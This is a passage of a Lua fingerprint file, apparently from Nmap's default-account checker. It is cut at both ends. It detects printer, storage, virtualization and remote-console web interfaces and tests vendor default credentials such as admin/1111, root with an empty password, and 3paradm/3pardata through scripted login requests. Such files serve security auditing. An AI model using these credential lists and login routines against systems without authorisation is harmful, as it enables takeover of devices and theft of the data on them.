    local header = {["Content-Type"]="text/plain", ["csrfpId"]=token}
    local msg = [[
      <DeviceInformationModel>
        <GetValue>
          <Authentication>
            <UserCredential></UserCredential>
          </Authentication>
        </GetValue>
        <GetValue>
          <Panel>
            <DiagnosticMode><Mode_08><Code_8913></Code_8913></Mode_08></DiagnosticMode>
          </Panel>
        </GetValue>
        <SetValue>
          <Authentication>
            <UserCredential>
              <userName>__USER__</userName>
              <passwd>__PASS__</passwd>
              <ipaddress>__IPADDR__</ipaddress>
              <DepartmentManagement isEnable='false'><requireDepartment></requireDepartment></DepartmentManagement>
              <domainName></domainName>
              <applicationType>TOP_ACCESS</applicationType>
            </UserCredential>
          </Authentication>
        </SetValue>
        <Command>
          <Login>
            <commandNode>Authentication/UserCredential</commandNode>
            <Params><appName>TOPACCESS</appName></Params>
          </Login>
        </Command>
        <SaveSessionInformation>
          <SessionInfo>
            <Information><type>LoginPassword</type><data>__PASS__</data></Information>
            <Information><type>LoginUser</type><data>__USER__</data></Information>
          </SessionInfo>
        </SaveSessionInformation>
      </DeviceInformationModel>]]
    msg = msg:gsub("^%s+", ""):gsub("\n%s*", "")
    msg = msg:gsub("__%w+__", {__USER__=xmlencode(user),
                               __PASS__=xmlencode(pass),
                               __IPADDR__=ipaddr})
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "contentwebserver"),
                                  {cookies=resp1.cookies, header=header}, msg)
    return resp2.status == 200
           and (resp2.body or ""):find("<Login>.-<statusOfOperation>STATUS_OK</statusOfOperation>.-</Login>")
  end
})

table.insert(fingerprints, {
  name = "Toshiba TopAccess SY",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 301
           and (response.header["location"] or ""):find("/TopAccess/default%.htm$")
  end,
  login_combos = {
    {username = "Admin", password = "123456"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "ADMIN/Login"),
                                 nil, {USERNAME=user,PASS=pass})
    return resp.status == 301 and get_cookie(resp, "sessid", "^0,%x+$")
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (var.1)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("XEROX WORKCENTRE", 1, true)
           and get_tag(response.body, "frame", {src="/header%.php%?tab=status$"})
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {_fun_function="HTTP_Authenticate_fn",
                  NextPage=url.absolute(path, "properties/authentication/luidLogin.php"),
                  webUsername=user,
                  webPassword=pass,
                  frmaltDomain="default"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "userpost/xerox.set"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("%Wwindow%.opener%.top%.location%s*=%s*window%.opener%.top%.location%.pathname%s*;")
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (var.2)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and (response.body or ""):find("RedirectToSWS()", 1, true)) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "sws/index.html"))
    return resp.status == 200
           and resp.body
           and resp.body:find("CentreWare", 1, true)
           and resp.body:lower():find("<title>[^<]-%f[%w]centreware%f[%W]")
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    local auth = "Basic " .. base64.enc(user .. ":" .. pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "sws/app/gnb/login/login.jsp"),
                                 nil, {Authentication=auth})
    return resp.status == 200
           and (resp.body or ""):find("%Wsuccess%s*:%s*true%W")
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (basic auth)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "CentreWare Internet Services"
  end,
  login_combos = {
    {username = "11111", password = "x-admin"},
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (basic auth var.1)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if  not (response.status == 200
            and response.body
            and response.body:find("hdstat.htm", 1, true)
            and get_tag(response.body, "frame", {src="^hdstat%.htm$"})) then
      return false
    end
    local lcbody = response.body:lower()
    return lcbody:find("<title>[%w%s]*workcentre%s")
           or lcbody:find("<title>%s*internet services%W")
           or lcbody:find("<title>%s*docucolor%W")
  end,
  login_combos = {
    {username = "11111", password = "x-admin"},
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "prscauthconf.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (basic auth var.2)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and (response.body or ""):find("ChangeDefWebLanguage()", 1, true)) then
      return false
    end
    local resp = http_get_simple(host, port, url.absolute(path, "home.html"))
    return (http_auth_realm(resp) or ""):find("%f[%w]WorkCentre%f[%W]")
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "home.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (basic auth var.3)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and (response.body or ""):find("ChangeDefWebLanguage()", 1, true)) then
      return false
    end
    local resp = http_get_simple(host, port, url.absolute(path, "home.html"))
    return resp.status == 200
           and resp.body
           and resp.body:find("Xerox", 1, true)
           and resp.body:lower():find("<title>[^<]-%f[%w]xerox%f[%W]")
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "properties/securitysettings.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (basic auth var.4)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Xerox", 1, true)
           and response.body:find("/status/statusAlerts.dhtml", 1, true)
           and response.body:find("/tabsFrame.dhtml", 1, true)
           and get_tag(response.body, "frame", {src="/tabsframe%.dhtml$"})
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "properties/maintenance/maintenance.dhtml"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (basic auth var.5)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and not response.header["server"]
           and response.body
           and response.body:find("Xerox", 1, true)
           and response.body:find("/js/deviceStatus.dhtml", 1, true)
           and response.body:find("/tabsFrame.dhtml", 1, true)
           and get_tag(response.body, "frame", {src="/tabsframe%.dhtml$"})
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "reloadMaintenance.dhtml"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Xerox CentreWare (basic auth var.6)",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Xerox_MicroServer")
           and response.body
           and response.body:find("Xerox", 1, true)
           and response.body:find("/js/deviceStatus.dhtml", 1, true)
           and response.body:find("/tabsFrame.dhtml", 1, true)
           and get_tag(response.body, "frame", {src="/tabsframe%.dhtml$"})
  end,
  login_combos = {
    {username = "admin", password = "1111"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "properties/upgrade/m_software.dhtml"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Zebra Printer",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Zebra Technologies", 1, true)
           and response.body:lower():find("<a%f[%s][^>]-%shref%s*=%s*(['\"])config%.html%1[^>]*>view printer configuration</a>")
  end,
  login_combos = {
    {username = "", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "authorize"),
                                 nil, {["0"]=pass})
    return resp.status == 200
           and (resp.body or ""):find(">Access Granted.", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Zebra Print Server",
  category = "printer",
  paths = {
    {path = "/server/TCPIPGEN.htm"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Network Print Server"
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "EFI Fiery Webtools",
  category = "printer",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["content-location"] or ""):find("^redirect%.html%.")
           and response.body
           and get_refresh_url(response.body, "^wt2parser%.cgi%?home_%w+$")
  end,
  login_combos = {
    {username = "Administrator", password = ""},
    {username = "Administrator", password = "Fiery.1"}
  },
  login_check = function (host, port, path, user, pass)
    local sessionid = host.ip
                      .. "_"
                      .. math.floor(stdnse.clock_ms())
                      .. math.random(100000, 999999)
    local encpass = xmlencode(pass)
    local header = {["Content-Type"]="text/xml", ["SOAPAction"]='""'}
    local soapmsg = [[
      <?xml version='1.0' encoding='UTF-8'?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <SOAP-ENV:Body>
          <ns1:doLogin xmlns:ns1="urn:FierySoapService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <sessionId xsi:type="xsd:string">__SESS__</sessionId>
            <in xsi:type="ns1:Login">
              <fieldsMask xsi:type="xsd:int">0</fieldsMask>
              <password xsi:type="xsd:string">__PASS__</password>
              <timeout xsi:type="xsd:int">30</timeout>
              <userName xsi:type="xsd:string" xsi:nil="true"/>
            </in>
          </ns1:doLogin>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>
      ]]
    soapmsg = soapmsg:gsub("%f[^\0\n]%s+", "")
    soapmsg = soapmsg:gsub("__%w+__", {__SESS__=sessionid, __PASS__=encpass})
    local resp = http_post_simple(host, port, url.absolute(path, "soap"),
                                 {header=header}, soapmsg)
    return resp.status == 200
           and (resp.body or ""):find('<result xsi:type="xsd:boolean">true</result>', 1, true)
  end
})

---
--Storage
---
table.insert(fingerprints, {
  name = "Areca RAID",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "Raid Console"
  end,
  login_combos = {
    {username = "admin", password = "0000"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Asustor ADM",
  cpe = "cpe:/o:asustor:data_master",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and get_refresh_url(response.body, "^portal/%?%x+$")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {account=user,
                  password=pass,
                  ["two-step-auth"]="true"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "portal/apis/login.cgi?act=login&_dc=" .. stdnse.clock_ms()),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.success and jout.account == user
  end
})

table.insert(fingerprints, {
  name = "HP StorageWorks SMU",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and response.body
           and response.body:find("checkAuthentication", 1, true)
           and get_tag(response.body, "script", {src="^js/js_brandstrings%.js$"})
  end,
  login_combos = {
    {username = "monitor", password = "!monitor"},
    {username = "manage",  password = "!manage"},
    {username = "admin",   password = "!admin"}
  },
  login_check = function (host, port, path, user, pass)
    local creds = stdnse.tohex(openssl.md5(user .. "_" .. pass))
    local header = {["Content-Type"]="application/x-www-form-urlencoded",
                    ["datatype"]="json"}
    local resp = http_post_simple(host, port, url.absolute(path, "api/"),
                                 {header=header}, "/api/login/" .. creds)
    return resp.status == 200
           and (resp.header["command-status"] or ""):find("^1 ")
  end
})

table.insert(fingerprints, {
  name = "HP 3PAR SSMC",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("StoreServ Management Console", 1, true)
           and response.body:lower():find("<title>storeserv management console</title>")
           and get_tag(response.body, "link", {href="^ssmc/css/"})
  end,
  login_combos = {
    {username = "", password = ""},
    {username = "3paradm",  password = "3pardata"},
    {username = "3parcust", password = "3parInServ"}
  },
  login_check = function (host, port, path, user, pass)
    if user == "" then
      local resp = http_get_simple(host, port,
                                  url.absolute(path, "foundation/REST/trustedservice/admincredentials"))
      if not (resp.status == 200 and resp.body) then return false end
      local jstatus, jout = json.parse(resp.body)
      return jstatus and jout.isAdminPasswordSet == false
    end
    local header = {["Accept"]="application/json, text/plain, */*",
                    ["Content-Type"]="application/json;charset=utf-8"}
    local jin = {username=user,
                 password=pass,
                 adminLogin=false,
                 authLoginDomain="LOCAL"}
    json.make_object(jin)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "foundation/REST/sessionservice/sessions"),
                                 {header=header}, json.generate(jin))
    return resp.status == 201
           and (resp.header["location"] or ""):find("/foundation/REST/sessionservice/sessions/%w+$")
  end
})

table.insert(fingerprints, {
  name = "IBM Storwize V3700",
  cpe = "cpe:/a:ibm:storwize_v3700_software",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("V3700", 1, true)
           and response.body:lower():find("<title>[^<]-%sibm storwize v3700%s*</title>")
  end,
  login_combos = {
    {username = "superuser", password = "passw0rd"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {login=user,
                 password=pass,
                 newPassword="",
                 confirmPassword="",
                 tzoffset="0", -- present twice in the original form
                 nextURL="",   -- present twice in the original form
                 licAccept=""}
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/gui$")
  end
})

table.insert(fingerprints, {
  name = "NAS4Free",
  cpe = "cpe:/a:nas4free:nas4free",
  category = "storage",
  paths = {
    {path = "/login.php"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("NAS4Free", 1, true)
           and response.body:find("?channels=#nas4free", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "nas4free"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, path, nil,
                                 {username=user,password=pass})
    return resp.status == 302
           and resp.header["location"] == "index.php"
  end
})

table.insert(fingerprints, {
  name = "Netgear ReadyNAS RAIDiator",
  cpe = "cpe:/o:netgear:raidiator",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and get_refresh_url(response.body, "/shares/$")
           and response.body:lower():find("netgear")
  end,
  login_combos = {
    {username = "admin", password = "netgear1"},
    {username = "admin", password = "infrant1"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "shares/"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Netgear ReadyNAS OS 6",
  category = "storage",
  paths = {
    {path = "/admin/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "ReadyNAS Admin"
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Netgear ReadyDATA OS",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "ReadyDATAOS"
  end,
  login_combos = {
    {username = "admin", password = "password"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "OpenMediaVault",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("openmediavault", 1, true)
           and response.body:lower():find("%ssrc%s*=%s*(['\"])[^'\"]-js/omv/rpc%.js%1")
  end,
  login_combos = {
    {username = "admin", password = "openmediavault"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Accept"]="application/json, */*",
                    ["Content-Type"]="application/json"}
    local jin = {service="Session",
                 method="login",
                 params={username=user,password=pass},
                 options=json.NULL}
    json.make_object(jin)
    local resp = http_post_simple(host, port, url.absolute(path, "rpc.php"),
                                 {header=header}, json.generate(jin))
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.response
           and jout.response.authenticated and jout.response.username == user
  end
})

table.insert(fingerprints, {
  name = "Pure Storage",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Pure Storage", 1, true)
           and response.body:lower():find("<title>pure storage ", 1, true)
           and get_tag(response.body, "form", {onsubmit="^pure%.page%.login%("})
  end,
  login_combos = {
    {username = "pureuser", password = "pureuser"}
  },
  login_check = function (host, port, path, user, pass)
    local jin = {username=user,
                 password=pass,
                 handler="session.query",
                 operation="login"}
    json.make_object(jin)
    local resp = http_post_simple(host, port, url.absolute(path, "login"),
                                 nil, {json=json.generate(jin)})
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    return jstatus and jout.userSession and jout.userSession.user == user
  end
})

table.insert(fingerprints, {
  name = "Quest DR",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Quest Software", 1, true)
           and response.body:lower():find("<cui-login-screen>", 1, true)
  end,
  login_combos = {
    {username = "administrator", password = "St0r@ge!"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {["Accept"]="application/json, text/plain, */*",
                    ["Content-Type"]="application/json;charset=utf-8"}
    local jin = {jsonrpc="2.0",
                 method="Logon",
                 params={UserName=user,Password=pass},
                 id=1}
    json.make_object(jin)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "ws/v1.0/jsonrpc"),
                                 {header=header}, json.generate(jin))
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(resp.body)
    if not (jstatus and jout.result) then return false end
    for _, obj in ipairs(jout.result.objects or {}) do
      if obj.SessionCookie then return true end
    end
    return false
  end
})

table.insert(fingerprints, {
  name = "Seagate BlackArmor NAS (var.1)",
  cpe = "cpe:/o:seagate:blackarmor_nas_*",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Seagate", 1, true)
           and response.body:lower():find("<title>seagate nas - ", 1, true)
           and get_tag(response.body, "input", {name="^p_user$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {p_user=user,
                  p_pass=pass,
                  lang="en",
                  xx=1,
                  loginnow="Login"}
    local resp = http_post_simple(host, port, path, nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/admin/system_status.php?", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Seagate BlackArmor NAS (var.2)",
  cpe = "cpe:/o:seagate:blackarmor_nas_*",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("BlackArmor", 1, true)
           and response.body:find("/index.php/mv_login/validate_user", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "index.php/mv_login/validate_user"),
                                 {header={["Accept"]="text/html, text/plain, */*"}},
                                 {username=user,password=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("/index.php/mv_home/admin_dashboard", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Toshiba Canvio",
  category = "storage",
  paths = {
    {path = "/login.php"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Canvio", 1, true)
           and response.body:find("/sconfig/cgi/hook_login.php", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local session, pageid = resp1.body:match("%Wfunction%s+mkPOSTParam%s*%("
                              .. "[^}]-%Wvar%s+s%s*=%s*['\"](%x+)"
                              .. "[^}]-%Wvar%s+p%s*=%s*['\"](%x+)")
    local action = resp1.body:match("%WpostParam%.aCtIoN%s*=%s*['\"](%x+)")
    if not (session and action) then return false end
    local form2 = {rn = math.random(1000000000000000,9999999999999999),
                   session = session,
                   pageid = pageid,
                   aCtIoN = action,
                   UsErNaMe = user,
                   PaSsWoRD = pass}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "sconfig/cgi/hook_login.php"),
                                  {cookies="PHPSESSID="..session}, form2)
    if not (resp2.status == 200 and resp2.body) then return false end
    local jstatus, jout = json.parse(resp2.body)
    return jstatus and jout.err == 0
  end
})

table.insert(fingerprints, {
  name = "Western Digital My Cloud",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and get_cookie(response, "PHPSESSID", "^%x+$")
           and response.body
           and response.body:find("/cgi-bin/login_mgr.cgi", 1, true)
           and response.body:find("%Wcmd:%s*(['\"])wd_login%1")
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local form = {cmd="wd_login",
                  username=user,
                  pwd=base64.enc(pass),
                  port=""}
    local resp2 = http_post_simple(host, port,
                                  url.absolute(path, "cgi-bin/login_mgr.cgi"),
                                  {cookies=resp1.cookies}, form)
    return resp2.status == 200
           and (resp2.body or ""):find("<config>.*<res>[1-9]</res>.*</config>")
  end
})

table.insert(fingerprints, {
  name = "WiseGiga",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("WISEGIGA", 1, true)
           and response.body:lower():find("<title>wisegiga</title>", 1, true)
           and get_tag(response.body, "a", {href="/webfolder/$"})
  end,
  login_combos = {
    {username = "guest", password = "guest09#$"},
    {username = "root",  password = "admin09#$"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {id=user,
                  passwd=pass,
                  remember_check=0,
                  sel_lang="en"}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "webfolder/login_check.php"),
                                 nil, form)
    return resp.status == 200
           and (resp.body or ""):find("%Wlocation%.href%s*=%s*(['\"])[Mm]ain%.php%1")
  end
})

table.insert(fingerprints, {
  name = "D-Link SharePort Web Access",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 200
           and (response.header["server"] or ""):find(" WEBACCESS/.- DIR%-%d+")
           and response.body
           and response.body:find("hex_hmac_md5", 1, true)
           and response.body:lower():find("<title>d%-link systems[^<]+ login</title>")
  end,
  login_combos = {
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local get_lurl = function ()
                       return url.absolute(path, "dws/api/Login?"
                                           .. math.floor(stdnse.clock_ms()))
                     end
    local resp1 = http_get_simple(host, port, get_lurl())
    if not (resp1.status == 200 and resp1.body) then return false end
    local jstatus, jout = json.parse(resp1.body)
    if not (jstatus and jout.uid and jout.challenge) then return false end
    local auth = stdnse.tohex(openssl.hmac("MD5", pass, user .. jout.challenge))
    local resp2 = http_post_simple(host, port, get_lurl(),
                                  {cookies = "uid=" .. jout.uid},
                                  {id=user, password=auth})
    if not (resp2.status == 200 and resp2.body) then return false end
    jstatus, jout = json.parse(resp2.body)
    return jstatus and jout.status == "ok"
  end
})

table.insert(fingerprints, {
  name = "EMC VMAX vApp Manager",
  category = "storage",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("VMAX", 1, true)
           and response.body:lower():find("<title>[^<]+ vmax</title>")
           and get_refresh_url(response.body, "/SE/?$")
  end,
  login_combos = {
    {username = "smc", password = "smc"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "SE/app"),
                                 nil, {user=user, passwd=pass})
    return resp.status == 200
           and get_cookie(resp, "JSESSIONID", ".")
           and (resp.body or ""):find("=%s*['\"]login=success&")
  end
})

---
--Virtualization systems
---
table.insert(fingerprints, {
  name = "VMware ESXi",
  cpe = "cpe:/o:vmware:esxi",
  category = "virtualization",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("ID_EESX_Welcome", 1, true)
           and response.body:find("/folder?dcPath=ha-datacenter", 1, true)
  end,
  login_combos = {
    {username = "root", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "folder?dcPath=ha-datacenter"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "VMware vCloud Connector",
  category = "virtualization",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and response.body
           and response.body:find("com.vmware.vami.", 1, true)
           and get_tag(response.body, "script", {src="^com%.vmware%.vami%.CoreWrapper%."})) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "service/core/view-deploy.xml"))
    return resp.status == 200
           and resp.body
           and resp.body:find("<name>Core</name>", 1, true)
           and get_tag(resp.body, "property", {value="^vCloud Connector Node$"})
  end,
  login_combos = {
    {username = "admin", password = "vmware"}
  },
  login_check = function (host, port, path, user, pass)
    local header = {Authorization="Basic " .. base64.enc(user .. ":" .. pass),
                    CIMProtocolVersion="1.0",
		    CIMOperation="MethodCall",
		    CIMMethod=urlencode_all("CreateSessionToken"):upper(),
                    CIMObject=urlencode_all("root/cimv2:VAMI_Authentication"):upper(),
                    ["Content-Type"]="application/xml; charset=UTF-8"}
    local msg = [[
      <?xml version="1.0" encoding="UTF-8"?>
      <CIM CIMVERSION="2.0" DTDVERSION="2.0">
        <MESSAGE ID="1" PROTOCOLVERSION="1.0">
          <SIMPLEREQ>
            <METHODCALL NAME="CreateSessionToken">
              <LOCALCLASSPATH>
                <LOCALNAMESPACEPATH>
                  <NAMESPACE NAME="root"/>
                  <NAMESPACE NAME="cimv2"/>
                </LOCALNAMESPACEPATH>
                <CLASSNAME NAME="VAMI_Authentication"/>
              </LOCALCLASSPATH>
            </METHODCALL>
          </SIMPLEREQ>
        </MESSAGE>
      </CIM>]]
    msg = msg:gsub("^%s+", ""):gsub("\n%s*", "")
    local resp = http_post_simple(host, port, url.absolute(path, "cimom"),
                                 {header=header}, msg)
    return resp.status == 200
           and (resp.body or ""):find("<PARAMVALUE%s+NAME%s*=%s*(['\"])Token%1")
  end
})

table.insert(fingerprints, {
  name = "PCoIP Zero Client",
  cpe = "cpe:/a:teradici:pcoip_host_software",
  category = "virtualization",
  paths = {
    {path = "/login.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("PCoIP&#174 Zero Client", 1, true)
           and response.body:find("password_value", 1, true)
  end,
  login_combos = {
    {username = "", password = "Administrator"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "cgi-bin/login"),
                                 nil, {password_value=pass, idle_timeout=60})
    return resp.status == 302 and get_cookie(resp, "session_id", "^%x+$")
  end
})

---
--Remote consoles
---
table.insert(fingerprints, {
  name = "Lantronix SLB/SLC",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^mini_httpd/%d+%.")
           and response.body
           and response.body:find("lantronix", 1, true)
           and response.body:find("slcpassword", 1, true)
  end,
  login_combos = {
    {username = "sysadmin", password = "PASS"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, path, nil,
                                 {slclogin=user, slcpassword=pass})
    return resp.status == 200
           and resp.body
           and (resp.body:find("User already logged into web")
             or get_tag(resp.body, "frame", {name="^data$", src="^home%.htm$"}))
  end
})

table.insert(fingerprints, {
  name = "Avocent Explorer",
  category = "console",
  paths = {
    {path = "/login.php"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Avocent", 1, true)
           and response.body:find("loginPassword", 1, true)
           and response.body:lower():find("<title>[^<]+ explorer</title>")
  end,
  login_combos = {
    {username = "Admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local form = {action="login",
                  token="",
                  loginUsername=user,
                  loginPassword=pass,
                  language="en"}
    local resp = http_post_simple(host, port, path, nil, form)
    return resp.status == 302
           and (resp.header["location"] or ""):find("/home%.php$")
           and get_cookie(resp, "avctSessionId", "^%d+$")
  end
})

table.insert(fingerprints, {
  name = "Bomgar Appliance",
  category = "console",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
